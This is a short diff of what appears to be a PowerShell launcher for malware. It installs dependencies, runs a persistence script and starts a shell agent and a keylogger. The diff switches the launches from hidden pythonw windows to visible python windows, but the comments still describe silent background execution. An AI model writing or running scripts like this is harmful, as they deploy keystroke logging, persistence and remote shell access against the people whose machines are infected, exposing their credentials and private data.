@@ -27,8 +27,8 @@ pip install -r "$dir\requirements.txt" -q
 python "$dir\persistence.py"
 
 # Launch shell_agent.py silently in background
-Start-Process pythonw -ArgumentList "$dir\shell_agent.py" -WindowStyle Hidden
+Start-Process python -ArgumentList "$dir\shell_agent.py" -WindowStyle Normal
 
 # Launch keylogger.py silently in background
-Start-Process pythonw -ArgumentList "$dir\keylogger.py" -WindowStyle Hidden
+Start-Process python -ArgumentList "$dir\keylogger.py" -WindowStyle Normal
 
